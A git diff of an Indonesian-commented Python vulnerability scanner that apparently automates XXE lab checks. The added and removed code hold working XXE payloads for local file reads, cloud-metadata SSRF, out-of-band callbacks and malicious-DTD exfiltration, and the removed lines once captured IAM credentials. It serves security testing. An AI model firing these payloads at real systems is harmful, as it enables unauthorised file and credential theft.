@@ -8007,25 +8007,27 @@ class SatriaBaruScanner:
 
     @staticmethod
     def _xxe_file_marker(text: str):
-        """Kenali fingerprint file lokal yang cukup khas; hindari section/kata umum."""
+        """Fingerprint file lokal meski root line diawali pesan error atau markup."""
         if not text:
             return None
+        decoded = html_module.unescape(str(text))
 
-        # Baris root lengkap dari /etc/passwd; daemon saja tidak cukup spesifik.
+        # Contoh respons lab: "Invalid product ID: root:x:0:0:root:/root:/bin/bash".
+        # Tidak di-anchor ke awal baris, tetapi seluruh tuple UID/GID/home/shell diwajibkan.
         root_line = re.search(
-            r"(?m)^root:[^:\r\n]*:0:0:[^:\r\n]*:/root:/[^:\r\n]+\s*$",
-            text,
+            r"(?i)(?<![A-Za-z0-9_])root:[^:\r\n<>]{0,128}:0:0:[^:\r\n<>]{0,128}:/root:/[A-Za-z0-9_./+-]+",
+            decoded,
         )
         if root_line:
-            return "/etc/passwd (baris root UID/GID 0)", root_line.group(0).strip()
+            return "/etc/passwd (root UID/GID 0)", root_line.group(0).strip()
 
-        # win.ini: komentar khas atau kombinasi beberapa section, bukan [fonts] tunggal.
-        win_header = re.search(r"(?i)for 16-bit app support", text)
+        # win.ini: komentar khas atau kombinasi dua section, bukan section generik tunggal.
+        win_header = re.search(r"(?i)for 16-bit app support", decoded)
         if win_header:
             return "Windows win.ini", win_header.group(0)
         sections = {
             value.lower()
-            for value in re.findall(r"(?im)^\s*\[([^\]\r\n]+)\]\s*$", text)
+            for value in re.findall(r"(?im)^\s*\[([^\]\r\n]+)\]\s*$", decoded)
         }
         if {"fonts", "mci extensions"}.issubset(sections):
             return "Windows win.ini (section fonts + mci extensions)", "[fonts] + [mci extensions]"
@@ -8033,24 +8035,16 @@ class SatriaBaruScanner:
 
     @staticmethod
     def _xxe_metadata_marker(text: str):
-        """Marker metadata cloud harus memuat format nilai yang khas, bukan nama field/path saja."""
+        """Fingerprint metadata instance non-rahasia; nilai credential tidak pernah dikumpulkan."""
         if not text:
             return None
-
-        access_key = re.search(r'"AccessKeyId"\s*:\s*"[^"\s]{8,}"', text, re.I)
-        secret_key = re.search(r'"SecretAccessKey"\s*:\s*"[^"\s]{12,}"', text, re.I)
-        if access_key and secret_key:
-            return "kredensial metadata IAM (AccessKeyId + SecretAccessKey)", (
-                access_key.group(0) + " | " + secret_key.group(0)
-            )
-
+        decoded = html_module.unescape(str(text))
         checks = (
-            (re.compile(r'''(?i)["']?(?:ami-id|imageId)["']?\s*[:=]\s*["']?ami-[0-9a-f]{8,}'''), "AMI instance metadata"),
-            (re.compile(r'''(?i)["']?(?:instance-id|instanceId)["']?\s*[:=]\s*["']?i-[0-9a-f]{8,}'''), "instance metadata"),
-            (re.compile(r'''(?i)["']?(?:placement/availability-zone|availabilityZone)["']?\s*[:=]\s*["']?[a-z]{2}(?:-gov)?-[a-z]+-[0-9][a-z]'''), "availability-zone metadata"),
+            (re.compile(r"(?i)\bami-[0-9a-f]{8,17}\b"), "AMI instance metadata"),
+            (re.compile(r"(?i)\bi-[0-9a-f]{8,17}\b"), "instance-id metadata"),
         )
-        for pat, label in checks:
-            match = pat.search(text)
+        for pattern, label in checks:
+            match = pattern.search(decoded)
             if match:
                 return label, match.group(0)
         return None
@@ -8083,7 +8077,11 @@ class SatriaBaruScanner:
             add(page.url)
             for form in getattr(page, "forms", [])[:10]:
                 names = {str(n).lower() for n, _, _ in getattr(form, "fields", [])}
-                if names & {"productid", "storeid"} or re.search(r"stock|xml|soap", getattr(form, "action", "") or "", re.I):
+                xml_fields = {
+                    "productid", "storeid", "xml", "data", "document", "content",
+                    "payload", "message", "request", "body", "stockid", "sku",
+                }
+                if names & xml_fields or re.search(r"stock|xml|soap|product|api", getattr(form, "action", "") or "", re.I):
                     add(form.action)
             blob = (page.text or "") + "\n" + (page.js_text or "")
             for m in re.finditer(r"""<form[^>]+action=["']([^"']+)["']""", blob, re.I):
@@ -8118,7 +8116,7 @@ class SatriaBaruScanner:
         for u in sorted(found, key=score):
             if u not in ordered:
                 ordered.append(u)
-        return ordered[:10]
+        return ordered[:16]
 
     def _xxe_post_xml(self, url: str, xml_body: str) -> "Response":
         attempts = (
@@ -8322,135 +8320,78 @@ class SatriaBaruScanner:
         return None
 
     def phase_xxe(self, pages: list[Page], points: list[Point]) -> None:
-        """Deteksi XXE/XInclude (75-83) dengan probe multi-vektor.
+        """XXE 75-83: uji in-band, XInclude, OOB, external DTD, local DTD, dan SVG.
 
-        Konfirmasi hanya dengan bukti kuat: isi file (marker /etc/passwd atau win.ini) pada respons,
-        kredensial metadata internal (SSRF XXE), atau interaksi/nilai exfiltrasi OOB terverifikasi.
-        Endpoint XML divalidasi lebih dulu dan baseline dibandingkan agar tidak false positive.
+        SATRIA_OOB_DTD_URL harus menunjuk ke DTD eksternal yang Anda host sendiri.
+        Template URL dapat memakai {token}, {domain}, {tag}, dan {callback}.
+        DTD tersebut harus mengirim callback ke domain OOB yang dikonfigurasi.
+        Tanpa DTD dan poller yang benar, lab exfil/error tidak dinyatakan terkonfirmasi.
         """
         if not self._within_budget():
             return
         endpoints = self._xxe_endpoints(pages)
+        self._scan_progress_event(f"XXE: {len(endpoints)} endpoint kandidat same-origin")
 
         def mark(num: int, url: str, kind: str, name: str, ev: str, method_name: str,
                  method: str = "POST", fields=None):
-            point = Point(key=f"xxe-{num}", kind=kind, label=f"endpoint {url}", url=url,
-                          name=name, original="", page_url=url, method=method,
-                          fields=tuple(fields) if fields else (), interest=6)
+            point = Point(
+                key=f"xxe-{num}", kind=kind, label=f"endpoint {url}", url=url,
+                name=name, original="", page_url=url, method=method,
+                fields=tuple(fields) if fields else (), interest=6,
+            )
             self._mark(num, point, ev, method_name)
 
-        # --- 75: external entity membaca file (in-band) ---
+        oob_ready = bool(
+            self.oob
+            and getattr(self.oob, "domain", None)
+            and getattr(self.oob, "poll_url", None)
+        )
+        oob_domain = str(getattr(self.oob, "domain", "") or "").strip(".")
+        oob_token = str(getattr(self.oob, "token", "") or "")
+
+        def _oob_uri(tag: str) -> str:
+            if not self.oob:
+                return ""
+            if getattr(self.oob, "kind", "") == "webhook_site":
+                return f"https://webhook.site/{self.oob.webhook_token or oob_token}/{tag}"
+            return f"http://{oob_token}.{tag}.{oob_domain}/"
+
+        def _oob_tag_seen(result, tag: str) -> bool:
+            values = getattr(result, "interactions", []) if result else []
+            joined = " ".join(str(item) for item in (values or []))
+            return bool(tag and tag.lower() in joined.lower())
+
+        def _expand_dtd_url(template: str, tag: str) -> str:
+            callback = _oob_uri(tag)
+            return (
+                template.replace("{token}", oob_token)
+                .replace("{domain}", oob_domain)
+                .replace("{tag}", tag)
+                .replace("{callback}", quote_plus(callback))
+            )
+
+        # 75: external general entity -> retrieve local file in-band.
         if 75 not in self._confirmed and self._within_budget():
-            hit = self._xxe_try_file_entity(endpoints, ["file:///etc/passwd", "file:///c:/windows/win.ini"])
+            self._scan_progress_event("XXE 75: external general entity dan marker file lokal")
+            hit = self._xxe_try_file_entity(
+                endpoints, ["file:///etc/passwd", "file:///c:/windows/win.ini"]
+            )
             if hit:
                 url, uri, label, sample = hit
-                mark(75, url, "xml", "body",
-                     f"Entitas eksternal XXE terverifikasi: respons memuat isi file {uri} ({label}: {snippet(sample, 80)!r}) "
-                     f"setelah payload dikirim ke {url}; marker tidak ada pada baseline benign.",
-                     "xxe_external_entity_file_read")
+                mark(
+                    75, url, "xml", "body",
+                    f"External entity XXE terbukti: respons memuat marker {label} dari {uri}; "
+                    f"marker tidak ada pada baseline benign ({snippet(sample, 80)!r}).",
+                    "xxe_external_entity_file_read",
+                )
 
-        # --- 81: XInclude membaca file (parameter form & body XML) ---
-        if 81 not in self._confirmed and self._within_budget():
-            hit = self._xxe_try_xinclude(endpoints, pages)
-            if hit:
-                url, vector, proof = hit
-                mark(81, url, "xml", "body",
-                     f"XInclude terverifikasi ({vector}): respons memuat isi file lokal melalui xi:include pada {url} "
-                     f"({proof}). Bukti in-band kuat.",
-                     "xxe_xinclude_file_read")
-
-        # --- 80: blind XXE via pesan error ---
-        if 80 not in self._confirmed and self._within_budget():
-            payloads = [
-                ('<?xml version="1.0" encoding="UTF-8"?>'
-                 '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
-                 '<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'),
-                ('<?xml version="1.0" encoding="UTF-8"?>'
-                 '<!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd">'
-                 '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'file:///invalid/%file;\'>">'
-                 '%eval;%exfil; ]><foo>bar</foo>'),
-            ]
-            for url in endpoints:
-                if 80 in self._confirmed or not self._within_budget():
-                    break
-                ready, baseline = self._xxe_endpoint_ready(url)
-                if not ready:
-                    continue
-                base_text = (baseline.text or "") if baseline else ""
-                for body in payloads:
-                    resp = self._xxe_post_xml(url, body)
-                    if resp is None or resp.error or not resp.text:
-                        continue
-                    found = self._xxe_file_marker(resp.text)
-                    if not found or found[1] in base_text:
-                        continue
-                    label, sample = found
-                    mark(80, url, "xml", "body",
-                         f"Kebocoran via pesan error XXE terverifikasi di {url}: respons memuat isi file "
-                         f"({label}: {snippet(sample, 80)!r}) setelah payload pemicu error.",
-                         "xxe_blind_error_message_leak")
-                    break
-
-        # --- 83: repurposing local DTD ---
-        if 83 not in self._confirmed and self._within_budget():
-            payloads = [
-                ('<?xml version="1.0" encoding="UTF-8"?>'
-                 '<!DOCTYPE message ['
-                 '<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">'
-                 '<!ENTITY % ISOamso \''
-                 '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
-                 '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">'
-                 '&#x25;eval;'
-                 '&#x25;error;'
-                 '\'>'
-                 '%local_dtd;'
-                 ']><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'),
-                ('<?xml version="1.0" encoding="UTF-8"?>'
-                 '<!DOCTYPE message ['
-                 '<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">'
-                 '<!ENTITY % ISOgrk1 \''
-                 '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
-                 '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">'
-                 '&#x25;eval;'
-                 '&#x25;error;'
-                 '\'>'
-                 '%local_dtd;'
-                 ']><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'),
-                ('<?xml version="1.0" encoding="UTF-8"?>'
-                 '<!DOCTYPE message ['
-                 '<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">'
-                 '<!ENTITY % expr \''
-                 '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
-                 '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">'
-                 '&#x25;eval;'
-                 '&#x25;error;'
-                 '\'>'
-                 '%local_dtd;'
-                 ']><foo>1</foo>'),
-            ]
-            for url in endpoints:
-                if 83 in self._confirmed or not self._within_budget():
-                    break
-                ready, baseline = self._xxe_endpoint_ready(url)
-                if not ready:
-                    continue
-                base_text = (baseline.text or "") if baseline else ""
-                for body in payloads:
-                    resp = self._xxe_post_xml(url, body)
-                    if resp is None or resp.error or not resp.text:
-                        continue
-                    found = self._xxe_file_marker(resp.text)
-                    if not found or found[1] in base_text:
-                        continue
-                    label, sample = found
-                    mark(83, url, "xml", "body",
-                         f"Repurposing local DTD terverifikasi di {url}: redefinisi entitas pada DTD lokal memicu "
-                         f"kebocoran file ({label}: {snippet(sample, 80)!r}).",
-                         "xxe_repurpose_local_dtd")
-                    break
-
-        # --- 76: XXE ke SSRF (metadata internal in-band, atau interaksi OOB) ---
+        # 76: SSRF via non-secret cloud metadata identifiers. Never request IAM credentials.
         if 76 not in self._confirmed and self._within_budget():
+            self._scan_progress_event("XXE 76: SSRF ke metadata instance non-rahasia")
+            metadata_uris = (
+                "http://169.254.169.254/latest/meta-data/ami-id",
+                "http://169.254.169.254/latest/meta-data/instance-id",
+            )
             for url in endpoints:
                 if 76 in self._confirmed or not self._within_budget():
                     break
@@ -8458,108 +8399,250 @@ class SatriaBaruScanner:
                 if not ready:
                     continue
                 base_text = (baseline.text or "") if baseline else ""
-                internal_uris = (
-                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/",
-                    "http://169.254.169.254/latest/meta-data/",
-                    "http://169.254.169.254/latest/dynamic/instance-identity/document",
-                )
-                for uri in internal_uris:
+                for uri in metadata_uris:
                     if 76 in self._confirmed or not self._within_budget():
                         break
-                    for body in self._xxe_bodies(uri):
+                    for body in self._xxe_bodies(uri)[:2]:
                         resp = self._xxe_post_xml(url, body)
                         if resp is None or resp.error or not resp.text:
                             continue
                         found = self._xxe_metadata_marker(resp.text)
                         if not found or found[1] in base_text:
                             continue
+                        label, _value = found
+                        mark(
+                            76, url, "xml", "body",
+                            f"XXE SSRF terbukti: parser mengambil {uri} dan respons memuat "
+                            f"fingerprint {label} yang tidak ada pada baseline. Nilai metadata "
+                            f"tidak disalin ke laporan.",
+                            "xxe_ssrf_instance_metadata",
+                        )
+                        break
+
+        # 77: external general entity OOB interaction. Send a small batch, then poll once.
+        if 77 not in self._confirmed and self._within_budget():
+            if not oob_ready:
+                self._scan_progress_event("XXE 77: OOB tidak dijalankan; domain + URL poller wajib tersedia")
+            else:
+                tag = f"xxe77{uuid.uuid4().hex[:8]}"
+                uri = _oob_uri(tag)
+                sent_to: list[str] = []
+                self._scan_progress_event("XXE 77: mengirim external general entity OOB")
+                for url in endpoints[:4]:
+                    if not self._within_budget():
+                        break
+                    ready, _ = self._xxe_endpoint_ready(url)
+                    if not ready:
+                        continue
+                    for body in self._xxe_bodies(uri)[:2]:
+                        if not self._within_budget():
+                            break
+                        resp = self._xxe_post_xml(url, body)
+                        if resp is not None and not resp.error:
+                            sent_to.append(url)
+                if sent_to:
+                    got = self._poll_oob()
+                    if _oob_tag_seen(got, tag):
+                        mark(
+                            77, sent_to[0], "xml", "body",
+                            f"Blind XXE terkonfirmasi: external general entity menghasilkan "
+                            f"interaksi OOB bertag unik {tag} setelah dikirim ke {sent_to[0]}.",
+                            "xxe_blind_oob_interaction",
+                        )
+
+        # 78: external parameter entity OOB interaction.
+        if 78 not in self._confirmed and self._within_budget():
+            if not oob_ready:
+                self._scan_progress_event("XXE 78: OOB tidak dijalankan; domain + URL poller wajib tersedia")
+            else:
+                tag = f"xxe78{uuid.uuid4().hex[:8]}"
+                uri = _oob_uri(tag)
+                sent_to: list[str] = []
+                payloads = (
+                    f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{uri}"> %xxe; ]>'
+                    '<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>',
+                    f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % ext SYSTEM "{uri}"> %ext; ]><foo>1</foo>',
+                )
+                self._scan_progress_event("XXE 78: external parameter entity (%xxe;) OOB")
+                for url in endpoints[:4]:
+                    if not self._within_budget():
+                        break
+                    ready, _ = self._xxe_endpoint_ready(url)
+                    if not ready:
+                        continue
+                    for body in payloads:
+                        if not self._within_budget():
+                            break
+                        resp = self._xxe_post_xml(url, body)
+                        if resp is not None and not resp.error:
+                            sent_to.append(url)
+                if sent_to:
+                    got = self._poll_oob()
+                    if _oob_tag_seen(got, tag):
+                        mark(
+                            78, sent_to[0], "xml", "body",
+                            f"Blind XXE terkonfirmasi melalui external parameter entity: "
+                            f"interaksi OOB bertag unik {tag} diterima setelah dikirim ke {sent_to[0]}.",
+                            "xxe_blind_oob_parameter_entity",
+                        )
+
+        # 79: external malicious DTD exfiltration requires the tester's DTD server.
+        dtd_template = (os.getenv("SATRIA_OOB_DTD_URL") or "").strip()
+        dtd_template_parsed = urlparse(dtd_template) if dtd_template else None
+        dtd_template_valid = bool(
+            dtd_template_parsed and dtd_template_parsed.scheme in ("http", "https")
+            and dtd_template_parsed.netloc
+        )
+        if 79 not in self._confirmed and self._within_budget():
+            if not (dtd_template_valid and oob_ready):
+                self._scan_progress_event(
+                    "XXE 79: perlu SATRIA_OOB_DTD_URL (DTD berbahaya yang Anda host) + poller OOB"
+                )
+            else:
+                tag = f"xxe79{uuid.uuid4().hex[:8]}"
+                dtd_url = _expand_dtd_url(dtd_template, tag)
+                payload = (
+                    '<?xml version="1.0"?>'
+                    f'<!DOCTYPE foo [ <!ENTITY % remote SYSTEM "{dtd_url}"> %remote; ]>'
+                    '<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'
+                )
+                sent_to: list[str] = []
+                self._scan_progress_event("XXE 79: menguji pemanggilan DTD eksternal milik penguji")
+                for url in endpoints[:4]:
+                    if not self._within_budget():
+                        break
+                    ready, _ = self._xxe_endpoint_ready(url)
+                    if not ready:
+                        continue
+                    resp = self._xxe_post_xml(url, payload)
+                    if resp is not None and not resp.error:
+                        sent_to.append(url)
+                if sent_to:
+                    got = self._poll_oob()
+                    got_values = getattr(got, "values", []) if got else []
+                    if got_values:
+                        mark(
+                            79, sent_to[0], "xml", "body",
+                            f"Blind XXE via external malicious DTD terkonfirmasi: poller OOB menerima "
+                            f"{len(got_values)} nilai hasil pemrosesan DTD. Nilai hasil eksfiltrasi "
+                            f"tidak disalin ke laporan.",
+                            "xxe_blind_oob_external_dtd_exfiltration",
+                        )
+
+        # 80: error-based XXE via an external DTD. Internal-subset nested parameter
+        # entities are not treated as a valid stand-alone implementation.
+        error_template = (
+            os.getenv("SATRIA_OOB_ERROR_DTD_URL")
+            or os.getenv("SATRIA_OOB_DTD_URL")
+            or ""
+        ).strip()
+        error_parsed = urlparse(error_template) if error_template else None
+        error_template_valid = bool(
+            error_parsed and error_parsed.scheme in ("http", "https") and error_parsed.netloc
+        )
+        if 80 not in self._confirmed and self._within_budget():
+            if not error_template_valid:
+                self._scan_progress_event(
+                    "XXE 80: perlu SATRIA_OOB_ERROR_DTD_URL yang menyajikan DTD error-based"
+                )
+            else:
+                tag = f"xxe80{uuid.uuid4().hex[:8]}"
+                error_dtd_url = _expand_dtd_url(error_template, tag)
+                payload = (
+                    '<?xml version="1.0"?>'
+                    f'<!DOCTYPE foo [ <!ENTITY % remote SYSTEM "{error_dtd_url}"> %remote; ]>'
+                    '<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'
+                )
+                self._scan_progress_event("XXE 80: error-based external DTD")
+                for url in endpoints[:6]:
+                    if 80 in self._confirmed or not self._within_budget():
+                        break
+                    ready, baseline = self._xxe_endpoint_ready(url)
+                    if not ready:
+                        continue
+                    resp = self._xxe_post_xml(url, payload)
+                    if resp is None or resp.error or not resp.text:
+                        continue
+                    found = self._xxe_file_marker(resp.text)
+                    base_text = (baseline.text or "") if baseline else ""
+                    if found and found[1] not in base_text:
                         label, sample = found
-                        mark(76, url, "xml", "body",
-                             f"XXE SSRF terverifikasi di {url}: parser mengambil URL internal {uri} dan respons "
-                             f"memuat data internal ({label}: {snippet(sample, 100)!r}).",
-                             "xxe_ssrf_internal_metadata")
+                        mark(
+                            80, url, "xml", "body",
+                            f"Error-based XXE terkonfirmasi: pesan parser memuat fingerprint {label} "
+                            f"yang tidak ada pada baseline ({snippet(sample, 80)!r}).",
+                            "xxe_blind_error_message_leak",
+                        )
                         break
 
-        # --- 77/78/79: blind XXE via OOB (interaksi/nilai exfil terverifikasi) ---
-        if self.oob and getattr(self.oob, "domain", None):
-            oob_domain = self.oob.domain
-            oob_token = getattr(self.oob, "token", "") or ""
+        # 81: XInclude (in-band file retrieval).
+        if 81 not in self._confirmed and self._within_budget():
+            self._scan_progress_event("XXE 81: XInclude pada form dan XML body")
+            hit = self._xxe_try_xinclude(endpoints, pages)
+            if hit:
+                url, vector, proof = hit
+                mark(
+                    81, url, "xml", "body",
+                    f"XInclude terbukti melalui {vector}: respons memuat marker file lokal "
+                    f"yang tidak ada pada baseline ({proof}).",
+                    "xxe_xinclude_file_read",
+                )
 
-            def _oob_url(tag: str) -> str:
-                host = f"{oob_token}.{tag}.{oob_domain}".strip(".")
-                return f"http://{host}/"
-
-            def _poll():
-                try:
-                    return self._poll_oob()
-                except Exception:
-                    return None
-
-            if 77 not in self._confirmed and self._within_budget():
-                uri = _oob_url(f"xxe77{uuid.uuid4().hex[:4]}")
-                for url in endpoints[:5]:
-                    if 77 in self._confirmed or not self._within_budget():
-                        break
-                    for body in self._xxe_bodies(uri):
-                        self._xxe_post_xml(url, body)
-                        got = _poll()
-                        if got and getattr(got, "interactions", None):
-                            mark(77, url, "xml", "body",
-                                 f"Interaksi OOB terverifikasi (external entity) ke {uri} setelah payload XXE "
-                                 f"dikirim ke {url}. Bukti blind XXE out-of-band.",
-                                 "xxe_blind_oob_interaction")
-                            break
-
-            if 78 not in self._confirmed and self._within_budget():
-                uri = _oob_url(f"xxe78{uuid.uuid4().hex[:4]}")
-                for url in endpoints[:5]:
-                    if 78 in self._confirmed or not self._within_budget():
-                        break
-                    for body in (
-                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{uri}"> %xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>',
-                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{uri}"> %xxe; ]><foo>1</foo>',
-                    ):
-                        self._xxe_post_xml(url, body)
-                        got = _poll()
-                        if got and getattr(got, "interactions", None):
-                            mark(78, url, "xml", "body",
-                                 f"Interaksi OOB terverifikasi via parameter entity (%xxe;) ke {uri} setelah payload "
-                                 f"dikirim ke {url}. Bukti blind XXE out-of-band.",
-                                 "xxe_blind_oob_parameter_entity")
-                            break
-
-            if 79 not in self._confirmed and self._within_budget():
-                uri = _oob_url(f"xxe79{uuid.uuid4().hex[:4]}")
-                for url in endpoints[:5]:
-                    if 79 in self._confirmed or not self._within_budget():
-                        break
-                    for body in (
-                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "{uri}"> %dtd; ]><foo>1</foo>',
-                        f'<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{uri}"> %xxe; ]><foo>1</foo>',
-                    ):
-                        self._xxe_post_xml(url, body)
-                        got = _poll()
-                        vals = getattr(got, "values", None) if got else None
-                        if not vals:
-                            continue
-                        val = vals[0] if isinstance(vals, (list, tuple)) else vals
-                        mark(79, url, "xml", "body",
-                             f"Exfiltrasi data OOB terverifikasi (nilai tertangkap: {snippet(str(val), 120)}) setelah "
-                             f"payload XXE dengan external DTD dikirim ke {url}.",
-                             "xxe_blind_oob_exfil_dtd")
-                        break
-
-        # --- 82: XXE via upload gambar SVG ---
+        # 82: SVG/image upload. Confirmation requires the rendered/uploaded resource
+        # to contain the decoded file marker, not merely an upload form being present.
         if 82 not in self._confirmed and self._within_budget():
+            self._scan_progress_event("XXE 82: jalur unggah SVG yang ditemukan pada akun")
             hit = self._xxe_try_svg_upload(pages)
             if hit:
                 url, field, body = hit
                 found = self._xxe_file_marker(body)
-                proof = f"{found[0]}: {snippet(found[1], 60)!r}" if found else "isi file"
-                mark(82, url, "upload", field,
-                     f"XXE via upload gambar terverifikasi: SVG ber-payload XXE diunggah melalui field '{field}' dan "
-                     f"respons/resource hasil upload ({url}) memuat isi file lokal ({proof}).",
-                     "xxe_image_upload_file_read")
+                if found:
+                    proof = f"{found[0]}: {snippet(found[1], 60)!r}"
+                    mark(
+                        82, url, "upload", field,
+                        f"XXE via SVG upload terkonfirmasi: respons/resource hasil pemrosesan "
+                        f"memuat marker file lokal ({proof}).",
+                        "xxe_image_upload_file_read",
+                    )
+
+        # 83: PortSwigger's local DTD technique: import docbookx.dtd and redefine ISOamso.
+        if 83 not in self._confirmed and self._within_budget():
+            self._scan_progress_event("XXE 83: local DTD docbookx.dtd dan redefinisi ISOamso")
+            local_dtd_payload = (
+                '<?xml version="1.0" encoding="UTF-8"?>'
+                '<!DOCTYPE message ['
+                '<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">'
+                '<!ENTITY % ISOamso \''
+                '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">'
+                '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">'
+                '&#x25;eval;'
+                '&#x25;error;'
+                '\'>'
+                '%local_dtd;'
+                ']>'
+                '<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'
+            )
+            for url in endpoints[:8]:
+                if 83 in self._confirmed or not self._within_budget():
+                    break
+                ready, baseline = self._xxe_endpoint_ready(url)
+                if not ready:
+                    continue
+                resp = self._xxe_post_xml(url, local_dtd_payload)
+                if resp is None or resp.error or not resp.text:
+                    continue
+                found = self._xxe_file_marker(resp.text)
+                base_text = (baseline.text or "") if baseline else ""
+                if found and found[1] not in base_text:
+                    label, sample = found
+                    mark(
+                        83, url, "xml", "body",
+                        f"Local DTD repurposing terkonfirmasi: redefinisi ISOamso dari "
+                        f"docbookx.dtd memicu pesan error yang memuat fingerprint {label} "
+                        f"({snippet(sample, 80)!r}).",
+                        "xxe_repurpose_local_dtd",
+                    )
+                    break
 
     def report(self) -> dict[str, Any]:
         labs = []
